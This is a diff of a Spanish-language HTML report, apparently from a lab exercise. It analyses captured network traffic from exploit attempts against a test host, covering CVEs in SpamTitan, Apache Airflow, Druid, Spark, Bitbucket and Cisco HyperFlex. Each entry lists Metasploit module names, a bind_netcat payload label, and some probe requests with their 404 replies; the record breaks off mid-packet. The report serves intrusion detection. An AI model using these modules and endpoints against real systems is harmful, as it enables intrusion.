@@ -91,40 +91,533 @@
         <div class="exploit-header">
             <div class="exploit-icon">🛡️</div>
             <div class="exploit-title">
-                OSVDB-34700
-                <span class="badge">CVE-2007-2447, OSVDB-34700, BID-23972</span>
+                CVE-2020-11698
+                <span class="badge">EDB-48856, <a href='https://www.titanhq.com/spamtitan/spamtitangateway/' target='_blank'>https://www.titanhq.com/spamtitan/spamtitangateway/</a>, CVE-2020-11698</span>
             </div>
         </div>
-        <div class="summary">Entre 2024-10-17 10:07:27–10:07:43 UTC se observó desde 172.19.0.3:38293 hacia 172.19.0.2:139 (NetBIOS/SMB) un intento de explotación Samba usermap_script (OSVDB-34700/CVE-2007-2447) usando Metasploit multi/samba/usermap_script con payload cmd/unix/bind_netcat (shell w,r). Secuencia: TCP SYN, SYN+ACK y ACK sin datos, seguido de negociación SMB “SMB Command: 0x72 (Negotiate Protocol)” con dialectos LANMAN1.</div>
+        <div class="summary">Entre 2024-09-25 10:25:11.126497 y 10:25:16.285574 UTC, 172.19.0.3:35433 inició TCP SYN hacia 172.19.0.2:80, recibiendo SYN+ACK y completando ACK. Se observó HTTP GET a http://tanuki-292fb064-6f2e-4883-93b7-dd7d0432c227-device/snmp-x.php con User-Agent “Chrome/117” desde 172.19.0.3 a 172.19.0.2, alineado con el exploit CVE-2020-11698 (SpamTitan unauth RCE, módulo freebsd/webapp/spamtitan_unauth_rce) y payload esperado cmd/unix/bind_netcat. El servidor respondió “HTTP/1.1 404 Not Found” (Apache/2.2.8 Ubuntu), sin comandos ni carga adicional; no se evidenció establecimiento de shell bind en el puerto destino. Actividad anómala: sondeo a /snmp-x.php.</div>
         <div class="exploit-details">
-            <p><span class="field-label">Exploit:</span> multi/samba/usermap_script</p>
+            <p><span class="field-label">Exploit:</span> freebsd/webapp/spamtitan_unauth_rce</p>
             <p><span class="field-label">Payload:</span> cmd/unix/bind_netcat</p>
-            <p><span class="field-label">Shell Type:</span> w, r</p>
-            <p><span class="field-label">Fuente:</span> vulnerability</p>
-            <p><span class="field-label">Ventana temporal:</span> 2024-10-17 10:07:27.278946+00:00 → 2024-10-17 10:07:43.435071+00:00</p>
-            <p><span class="field-label">Fuente:</span> vulnerability</p>
+            <p><span class="field-label">Shell Type:</span> </p>
+            <p><span class="field-label">Fuente:</span> warning</p>
+            <p><span class="field-label">Ventana temporal:</span> 2024-09-25 10:25:11.126497+00:00 → 2024-09-25 10:25:16.285574+00:00</p>
+            <p><span class="field-label">Fuente:</span> warning</p>
         </div>
         <h3>Paquetes asociados</h3>
         <ul class="packet-list">
             <li class="packet">
                 <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T10:07:29.496525+00:00</p>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:25:13.522422+00:00</p>
                     <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
                     <p><span class="field-label">Payload interpretado:</span></p>
                     <div class="payload"></div>
                     <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
-                    <p><span class="field-label">Puertos:</span> 38293 → 139</p>
+                    <p><span class="field-label">Puertos:</span> 35433 → 80</p>
                     <p><span class="field-label">Comandos:</span> —</p>
                     <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> Conexión TCP SYN de 172.19.0.3:38293 a 172.19.0.2:139 (NetBIOS/SMB), inicio de intento de explotación relacionado con Samba usermap_script (OSVDB-34700 / CVE-2007-2447). Sin carga útil de aplicación (solo SYN). Protocolo marcado como UNKNOWN en el trazo.</p>
+                    <p><span class="field-label">Observaciones:</span> Intento de conexión TCP (SYN) desde 172.19.0.3:35433 hacia 172.19.0.2:80 durante ventana del 2024-09-25 10:25:11-10:25:16, presuntamente para explotar CVE-2020-11698 (spamtitan_unauth_rce). Sin carga útil visible en este paquete inicial.</p>
                 </div>
             </li>
             <li class="packet">
                 <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T10:07:29.497055+00:00</p>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:25:13.522703+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">HTTP</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload">GET /snmp-x.php HTTP/1.1..Host: tanuki-292fb064-6f2e-4883-93b7-dd7d0432c227-device..User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36....</div>
+                    <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
+                    <p><span class="field-label">Puertos:</span> 35433 → 80</p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> http://tanuki-292fb064-6f2e-4883-93b7-dd7d0432c227-device/snmp-x.php</p>
+                    <p><span class="field-label">Observaciones:</span> Tráfico HTTP desde 172.19.0.3:35433 hacia 172.19.0.2:80 con solicitud GET a /snmp-x.php, host tanuki-...-device, compatible con intento de explotación no autenticada de SpamTitan (CVE-2020-11698, exploit freebsd/webapp/spamtitan_unauth_rce) durante la ventana 2024-09-25 10:25:11Z–10:25:16Z.</p>
+                </div>
+            </li>
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:25:13.523263+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">HTTP</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload">HTTP/1.1 404 Not Found..Date: Wed, 25 Sep 2024 10:25:13 GMT..Server: Apache/2.2.8 (Ubuntu) DAV/2..Content-Length: 329..Content-Type: text/html; charset=iso-8859-1....<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">.<html><head>.<title>404 Not Found</title>.</head><body>.<h1>Not Found</h1>.<p>The requested URL /snmp-x.php was not found on this server.</p>.<hr>.<address>Apache/2.2.8 (Ubuntu) DAV/2 Server at tanuki-292fb064-6f2e-4883-93b7-dd7d0432c227-device Port 80</address>.</body></html>.</div>
+                    <p><span class="field-label">IPs:</span> </p>
+                    <p><span class="field-label">Puertos:</span> </p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> </p>
+                </div>
+            </li>
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:25:13.522447+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload"></div>
+                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
+                    <p><span class="field-label">Puertos:</span> 80 → 35433</p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> SYN+ACK desde 172.19.0.2:80 a 172.19.0.3:35433 dentro de la ventana del exploit freebsd/webapp/spamtitan_unauth_rce (CVE-2020-11698). Sin carga útil (len=0); solo establecimiento de conexión. Opciones TCP: MSS=1460, WS=7, TS=266720680/308210377.</p>
+                </div>
+            </li>
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:25:13.522724+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload"></div>
+                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
+                    <p><span class="field-label">Puertos:</span> 80 → 35433</p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> Paquete TCP ACK sin datos desde 172.19.0.2:80 hacia 172.19.0.3:35433 en ventana temporal del presunto intento de explotación CVE-2020-11698 (SpamTitan unauth RCE). Respuesta del servicio HTTP sin carga útil observable.</p>
+                </div>
+            </li>
+        </ul>
+    </div>
+    <div class="exploit-block">
+        <div class="exploit-header">
+            <div class="exploit-icon">🛡️</div>
+            <div class="exploit-title">
+                CVE-2020-11978
+                <span class="badge">EDB-49927, CVE-2020-11978, CVE-2020-13927</span>
+            </div>
+        </div>
+        <div class="summary">Entre 2024-09-25 10:26:05.519128Z y 10:26:11.069921Z se observó intento de explotación de Apache Airflow (CVE-2020-11978) desde 172.19.0.3:40437 hacia 172.19.0.2:8080, con TCP SYN (opciones hex: 02:04:05:b4:04:02:08:0a:12:5f:c0:76:00:00:00:00:01:03:03:07) y posterior RST,ACK desde 172.19.0.2 indicando reset. El atacante emplea payload cmd/unix/bind_netcat para abrir bind shell vía netcat (herramienta: Metasploit), aunque no se capturaron comandos. Tráfico interno apunta a secuencia: entrega exploit HTTP a Airflow, intento de ejecución remota y establecimiento de shell en puerto ligado. URLs relacionadas: https://github.com/pberba/CVE-2020-11978/ y listas de Apache.</div>
+        <div class="exploit-details">
+            <p><span class="field-label">Exploit:</span> linux/http/apache_airflow_dag_rce</p>
+            <p><span class="field-label">Payload:</span> cmd/unix/bind_netcat</p>
+            <p><span class="field-label">Shell Type:</span> </p>
+            <p><span class="field-label">Fuente:</span> warning</p>
+            <p><span class="field-label">Ventana temporal:</span> 2024-09-25 10:26:05.519128+00:00 → 2024-09-25 10:26:11.069921+00:00</p>
+            <p><span class="field-label">Fuente:</span> warning</p>
+        </div>
+        <h3>Paquetes asociados</h3>
+        <ul class="packet-list">
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:26:08.222544+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload"></div>
+                    <p><span class="field-label">IPs:</span> </p>
+                    <p><span class="field-label">Puertos:</span> </p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> </p>
+                </div>
+            </li>
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:26:08.222563+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload"></div>
+                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
+                    <p><span class="field-label">Puertos:</span> 8080 → 40437</p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> Tráfico interno relacionado con intento de explotación de Apache Airflow (CVE-2020-11978) contra servicio en 172.19.0.2:8080. Paquete TCP sin datos con RST,ACK desde 172.19.0.2:8080 hacia 172.19.0.3:40437, indicando reset de conexión durante la ventana 2024-09-25T10:26:05.519128Z a 2024-09-25T10:26:11.069921Z.</p>
+                </div>
+            </li>
+        </ul>
+    </div>
+    <div class="exploit-block">
+        <div class="exploit-header">
+            <div class="exploit-icon">🛡️</div>
+            <div class="exploit-title">
+                CVE-2020-13927
+                <span class="badge">EDB-49927, CVE-2020-11978, CVE-2020-13927</span>
+            </div>
+        </div>
+        <div class="summary">Entre 2024-09-25 10:26:24.252371+00:00 y 10:26:29.836426+00:00 se observó actividad dirigida a Apache Airflow (CVE-2020-13927): el origen 172.19.0.3:37531 inició TCP SYN hacia 172.19.0.2:8080, seguido de RST-ACK desde 172.19.0.2, sin carga útil de aplicación. La secuencia sugiere intento de RCE vía DAG con payload cmd/unix/bind_netcat para exponer un bind shell, aunque no se evidenciaron comandos ni transferencia de payload. IoCs incluyen las URLs de referencia (exploit-db 49927, repositorio pberba/CVE-2020-11978, hilos de Apache). Actividad sospechosa: conexiones fallidas repetidas al puerto 8080 sin datos.</div>
+        <div class="exploit-details">
+            <p><span class="field-label">Exploit:</span> linux/http/apache_airflow_dag_rce</p>
+            <p><span class="field-label">Payload:</span> cmd/unix/bind_netcat</p>
+            <p><span class="field-label">Shell Type:</span> </p>
+            <p><span class="field-label">Fuente:</span> warning</p>
+            <p><span class="field-label">Ventana temporal:</span> 2024-09-25 10:26:24.252371+00:00 → 2024-09-25 10:26:29.836426+00:00</p>
+            <p><span class="field-label">Fuente:</span> warning</p>
+        </div>
+        <h3>Paquetes asociados</h3>
+        <ul class="packet-list">
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:26:26.976418+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload"></div>
+                    <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
+                    <p><span class="field-label">Puertos:</span> 37531 → 8080</p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> Sonda de conexión TCP SYN desde 172.19.0.3:37531 hacia 172.19.0.2:8080 (posible Apache Airflow webserver) durante ventana del pentest para CVE-2020-13927; no hay datos de aplicación ni payload (solo establecimiento de sesión).</p>
+                </div>
+            </li>
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:26:26.976439+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload"></div>
+                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
+                    <p><span class="field-label">Puertos:</span> 8080 → 37531</p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> https://www.exploit-db.com/exploits/49927, https://github.com/pberba/CVE-2020-11978/, https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx, https://lists.apache.org/thread/mq1bpqf3ztg1nhyc5qbrjobfrzttwx1d</p>
+                    <p><span class="field-label">Observaciones:</span> Tráfico TCP sin carga útil visible asociado a intento de explotación de Apache Airflow DAG RCE (CVE-2020-13927). El host 172.19.0.2:8080 responde con RST-ACK a 172.19.0.3:37531, indicando restablecimiento de la conexión durante la ventana 2024-09-25T10:26:24.252371Z a 2024-09-25T10:26:29.836426Z.</p>
+                </div>
+            </li>
+        </ul>
+    </div>
+    <div class="exploit-block">
+        <div class="exploit-header">
+            <div class="exploit-icon">🛡️</div>
+            <div class="exploit-title">
+                CVE-2021-25646
+                <span class="badge">CVE-2021-25646, <a href='https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E' target='_blank'>https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E</a>, <a href='https://github.com/yaunsky/cve-2021-25646/blob/main/cve-2021-25646.py' target='_blank'>https://github.com/yaunsky/cve-2021-25646/blob/main/cve-2021-25646.py</a></span>
+            </div>
+        </div>
+        <div class="summary">Entre 2024-09-25 10:26:43.020 y 10:26:48.170 se observó un intento de explotación de CVE-2021-25646 (Apache Druid RCE) desde 172.19.0.3:36943 hacia 172.19.0.2:8888 vía TCP. Secuencia: SYN de 172.19.0.3, respuesta del servidor 172.19.0.2 con RST/ACK, sin establecimiento de sesión y sin transferencia de datos. No se capturaron payloads (genéricos/custom), comandos, ni URLs; tampoco se evidenció apertura de shell. Herramientas no identificadas. Actividad sospechosa: conexión dirigida al puerto 8888 (Druid) fallida por reinicio remoto, lo que indica intento de acceso inicial bloqueado antes de enviar la carga.</div>
+        <div class="exploit-details">
+            <p><span class="field-label">Exploit:</span> linux/http/apache_druid_js_rce</p>
+            <p><span class="field-label">Payload:</span> generic/custom</p>
+            <p><span class="field-label">Shell Type:</span> </p>
+            <p><span class="field-label">Fuente:</span> warning</p>
+            <p><span class="field-label">Ventana temporal:</span> 2024-09-25 10:26:43.020488+00:00 → 2024-09-25 10:26:48.169930+00:00</p>
+            <p><span class="field-label">Fuente:</span> warning</p>
+        </div>
+        <h3>Paquetes asociados</h3>
+        <ul class="packet-list">
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:26:45.446511+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload"></div>
+                    <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
+                    <p><span class="field-label">Puertos:</span> 36943 → 8888</p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> Intento de conexión TCP (SYN) desde 172.19.0.3:36943 a 172.19.0.2:8888 sin carga útil. Contexto de explotación de CVE-2021-25646 (Apache Druid RCE) contra el servicio en 8888 dentro de la ventana indicada.</p>
+                </div>
+            </li>
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:26:45.446532+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload"></div>
+                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
+                    <p><span class="field-label">Puertos:</span> 8888 → 36943</p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> Tráfico TCP relacionado con intento de acceso al servicio en 172.19.0.2:8888 (asociado a Apache Druid) dentro de la ventana del exploit CVE-2021-25646; el servidor responde con RST/ACK sin datos hacia 172.19.0.3:36943, indicando reinicio de conexión en protocolo no identificado (UNKNOWN).</p>
+                </div>
+            </li>
+        </ul>
+    </div>
+    <div class="exploit-block">
+        <div class="exploit-header">
+            <div class="exploit-icon">🛡️</div>
+            <div class="exploit-title">
+                CVE-2022-33891
+                <span class="badge"><a href='https://lists.apache.org/thread/p847l3kopoo5bjtmxrcwk21xp6tjxqlc' target='_blank'>https://lists.apache.org/thread/p847l3kopoo5bjtmxrcwk21xp6tjxqlc</a>, <a href='https://attackerkb.com/topics/5FyKBES4BL/cve-2022-33891' target='_blank'>https://attackerkb.com/topics/5FyKBES4BL/cve-2022-33891</a>, CVE-2022-33891</span>
+            </div>
+        </div>
+        <div class="summary">Entre 2024-09-25 10:27:35.316106 y 10:27:40.459313 UTC se observó un intento de explotación de CVE-2022-33891 contra Apache Spark: 172.19.0.3:42393 inició TCP (SYN) hacia 172.19.0.2:8080, con respuesta RST+ACK del servidor, sin datos de aplicación. No se capturaron payloads ni comandos, pero el payload declarado fue cmd/unix/bind_netcat, típico de Metasploit, para abrir una bind shell vía netcat en el host víctima. Secuencia: descubrimiento/targeting del puerto 8080, conexión inicial, reinicio por el servidor, sesión no establecida. Actividad sospechosa focalizada en Spark UI sin autenticación.</div>
+        <div class="exploit-details">
+            <p><span class="field-label">Exploit:</span> linux/http/apache_spark_rce_cve_2022_33891</p>
+            <p><span class="field-label">Payload:</span> cmd/unix/bind_netcat</p>
+            <p><span class="field-label">Shell Type:</span> </p>
+            <p><span class="field-label">Fuente:</span> warning</p>
+            <p><span class="field-label">Ventana temporal:</span> 2024-09-25 10:27:35.316106+00:00 → 2024-09-25 10:27:40.459313+00:00</p>
+            <p><span class="field-label">Fuente:</span> warning</p>
+        </div>
+        <h3>Paquetes asociados</h3>
+        <ul class="packet-list">
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:27:37.659308+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload"></div>
+                    <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
+                    <p><span class="field-label">Puertos:</span> 42393 → 8080</p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> Intento de conexión TCP (SYN) desde 172.19.0.3:42393 hacia 172.19.0.2:8080 dentro de la ventana temporal del presunto exploit CVE-2022-33891 contra Apache Spark. No se observa carga útil ni comandos; solo establecimiento de sesión al puerto 8080.</p>
+                </div>
+            </li>
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:27:37.659332+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload"></div>
+                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
+                    <p><span class="field-label">Puertos:</span> 8080 → 42393</p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> Tráfico TCP con reset (RST+ACK) desde 172.19.0.2:8080 hacia 172.19.0.3:42393 durante la ventana del intento de explotación de CVE-2022-33891. No hay carga útil de aplicación ni datos del protocolo (UNKNOWN). Indica intento de conexión hacia el servicio en 8080 que fue reseteado por el extremo servidor.</p>
+                </div>
+            </li>
+        </ul>
+    </div>
+    <div class="exploit-block">
+        <div class="exploit-header">
+            <div class="exploit-icon">🛡️</div>
+            <div class="exploit-title">
+                CVE-2022-36804
+                <span class="badge"><a href='https://blog.assetnote.io/2022/09/14/rce-in-bitbucket-server/' target='_blank'>https://blog.assetnote.io/2022/09/14/rce-in-bitbucket-server/</a>, <a href='https://confluence.atlassian.com/bitbucketserver/bitbucket-server-and-data-center-advisory-2022-08-24-1155489835.html' target='_blank'>https://confluence.atlassian.com/bitbucketserver/bitbucket-server-and-data-center-advisory-2022-08-24-1155489835.html</a>, <a href='https://attackerkb.com/topics/iJIxJ6JUow/cve-2022-36804/rapid7-analysis' target='_blank'>https://attackerkb.com/topics/iJIxJ6JUow/cve-2022-36804/rapid7-analysis</a></span>
+            </div>
+        </div>
+        <div class="summary">Entre 2024-09-25 10:28:27.751209+00:00 y 10:28:32.899310+00:00 se observó un intento de explotación de CVE-2022-36804 (Bitbucket git command injection) desde 172.19.0.3:43419 hacia 172.19.0.2:7990 (Bitbucket Server) vía TCP/HTTP. Secuencia: SYN inicial y posterior RST/ACK de 172.19.0.2:7990, sin datos de aplicación ni solicitudes HTTP registradas. No se entregaron payloads (payload genérico/personalizado no transmitido), ni se ejecutaron comandos; sin shell establecida. Herramienta probable: módulo linux/http/bitbucket_git_cmd_injection (Metasploit). Actividad sospechosa: conexión efímera a puerto 7990 y reinicio de sesión que sugiere intento de inyección bloqueado/fallido.</div>
+        <div class="exploit-details">
+            <p><span class="field-label">Exploit:</span> linux/http/bitbucket_git_cmd_injection</p>
+            <p><span class="field-label">Payload:</span> generic/custom</p>
+            <p><span class="field-label">Shell Type:</span> </p>
+            <p><span class="field-label">Fuente:</span> warning</p>
+            <p><span class="field-label">Ventana temporal:</span> 2024-09-25 10:28:27.751209+00:00 → 2024-09-25 10:28:32.899310+00:00</p>
+            <p><span class="field-label">Fuente:</span> warning</p>
+        </div>
+        <h3>Paquetes asociados</h3>
+        <ul class="packet-list">
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:28:30.188273+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload"></div>
+                    <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
+                    <p><span class="field-label">Puertos:</span> 43419 → 7990</p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> Conexión TCP inicial (SYN) desde 172.19.0.3:43419 hacia 172.19.0.2:7990 (Bitbucket Server) durante intento de explotación CVE-2022-36804 (linux/http/bitbucket_git_cmd_injection). No se observa carga útil de aplicación ni solicitud HTTP; solo establecimiento de sesión.</p>
+                </div>
+            </li>
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:28:30.188292+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload"></div>
+                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
+                    <p><span class="field-label">Puertos:</span> 7990 → 43419</p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> Tráfico entre 172.19.0.2:7990 (Bitbucket) y 172.19.0.3:43419; paquete TCP RST/ACK desde 172.19.0.2 sin datos de aplicación; la conexión fue reiniciada en la ventana temporal del intento de explotación de CVE-2022-36804 (bitbucket_git_cmd_injection).</p>
+                </div>
+            </li>
+        </ul>
+    </div>
+    <div class="exploit-block">
+        <div class="exploit-header">
+            <div class="exploit-icon">🛡️</div>
+            <div class="exploit-title">
+                CVE-2021-1497
+                <span class="badge">CVE-2021-1497, CVE-2021-1498, <a href='https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-hyperflex-rce-TjjNrkpR' target='_blank'>https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-hyperflex-rce-TjjNrkpR</a></span>
+            </div>
+        </div>
+        <div class="summary"></div>
+        <div class="exploit-details">
+            <p><span class="field-label">Exploit:</span> linux/http/cisco_hyperflex_hx_data_platform_cmd_exec</p>
+            <p><span class="field-label">Payload:</span> cmd/unix/bind_netcat</p>
+            <p><span class="field-label">Shell Type:</span> </p>
+            <p><span class="field-label">Fuente:</span> warning</p>
+            <p><span class="field-label">Ventana temporal:</span> 2024-09-25 10:30:13.192022+00:00 → 2024-09-25 10:30:18.350882+00:00</p>
+            <p><span class="field-label">Fuente:</span> warning</p>
+        </div>
+        <h3>Paquetes asociados</h3>
+        <ul class="packet-list">
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:30:15.562811+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload"></div>
+                    <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
+                    <p><span class="field-label">Puertos:</span> 36509 → 80</p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> Conexión TCP inicial (SYN) desde 172.19.0.3:36509 hacia 172.19.0.2:80 durante la ventana indicada. Sin datos de aplicación visibles. Contexto indica posible inicio de explotación HTTP de Cisco HyperFlex (CVE-2021-1497) usando linux/http/cisco_hyperflex_hx_data_platform_cmd_exec.</p>
+                </div>
+            </li>
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:30:15.563040+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">HTTP</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload">POST /storfs-asup HTTP/1.1..Host: tanuki-292fb064-6f2e-4883-93b7-dd7d0432c227-device..User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36..Content-Type: application/x-www-form-urlencoded..Content-Length: 0....</div>
+                    <p><span class="field-label">IPs:</span> </p>
+                    <p><span class="field-label">Puertos:</span> </p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> </p>
+                </div>
+            </li>
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:30:15.563421+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">HTTP</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload">HTTP/1.1 404 Not Found..Date: Wed, 25 Sep 2024 10:30:15 GMT..Server: Apache/2.2.8 (Ubuntu) DAV/2..Content-Length: 330..Content-Type: text/html; charset=iso-8859-1....<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">.<html><head>.<title>404 Not Found</title>.</head><body>.<h1>Not Found</h1>.<p>The requested URL /storfs-asup was not found on this server.</p>.<hr>.<address>Apache/2.2.8 (Ubuntu) DAV/2 Server at tanuki-292fb064-6f2e-4883-93b7-dd7d0432c227-device Port 80</address>.</body></html>.</div>
+                    <p><span class="field-label">IPs:</span> </p>
+                    <p><span class="field-label">Puertos:</span> </p>
+                    <p><span class="field-label">Comandos:</span> —</p>
+                    <p><span class="field-label">URLs:</span> —</p>
+                    <p><span class="field-label">Observaciones:</span> </p>
+                </div>
+            </li>
+            <li class="packet">
+                <div>
+                    <p><span class="field-label">Timestamp:</span> 2024-09-25T10:30:15.562841+00:00</p>
+                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
+                    <p><span class="field-label">Payload interpretado:</span></p>
+                    <div class="payload"></div>
+                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
+                    <p><span class="field-label">Puertos:</span> 80 → 36509</p>
+                    <p><span class="field-label">Comandos:</span> —</p>
